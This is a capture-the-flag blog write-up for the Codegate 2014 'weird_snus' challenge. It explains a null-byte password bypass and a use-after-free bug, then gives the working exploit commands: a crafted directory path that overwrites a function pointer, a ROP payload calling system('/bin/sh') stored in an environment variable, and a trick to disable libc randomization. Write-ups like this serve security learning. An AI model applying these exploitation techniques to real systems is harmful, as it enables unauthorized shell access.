---
title: Codegate CTF Quals 2014 weird_snus writeup
author: kelwin
layout: post
permalink: /2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/
comments: true
categories:
  - CTF
  - writeup
---

## vulnerabilities
1. Password protection can be easily bypassed by giving a input of '0x00'
2. We quickly identified there is a use-after-free bug. After verifying the password, the program runs into an endless command processing mode, where user can input various buffer command to do some strange things. The first letter in each command represents the action to perform. Command A will check if a struct pointer exists, if so, it will call the function pointer in the struct, or it will allocate a new struct. Command D will reallocate the struct can free it later without cleat the struct pointer. So fist calling command D, and then calling command A will trigger a use-after-free crash. If we find somewhere to do the similar size malloc and fill the struct including the function pointer, we could hijack the control of the program.

## Exploitation

Luckily we found that there is a command M can do arbitrary size allocation. The path of current working directory will be put in the content of the new allocation. So we can construct a directory, whose path contains evil function pointer. Then we trigger the use-after-free bug mentioned above.

To get a shell, we first put a large amount of ROP payload(system('/bin/sh')) in the environment variable,
and then we use an `add esp` gadget in the libc to raise the stack to the place where environment variables are stored in. `ulimit -s unlimited` trick is used to get rid of libc address randomization.

## Code

### important addresses

    system: 0x40079260 
    binsh: 0x401a1b98

    11817d:       81 c4 8c 22 00 00       add    $0x228c,%esp
    0x40079260 - 0x41260 + 0x11817d 0x4015017d   \x7d\x01\x15\x40

### commands
Disable libc randomization:
    
    ulimit -s unlimited

Create a directory and cd to it:
    
    python -c 'import os; os.makedirs("/tmp/aaaa/aa\x7d\x01\x15\x40")'

Set ROP payloads in an environment variable and trigger use-after-free bug. Notice that the python variable `o` should be adjusted to achieve the stack alignment. The number below is just an example.

    export EXPLOIT=$(python -c 'o = 4; print "a" * o + "\x60\x92\x07\x40\x60\x92\x07\x40\x98\x1b\x1a\x40\x98\x1b\x1a\x40" * 2000+"a" * (8 - o)'); (python -c 'print "\x00\nkelwin\nA\nM\nG\x10\x00\x00\x00\nA\n"'; echo "cat /home/strongest_snus/flag"; cat ) | /home/strongest_snus/weird_snus \(
    
 
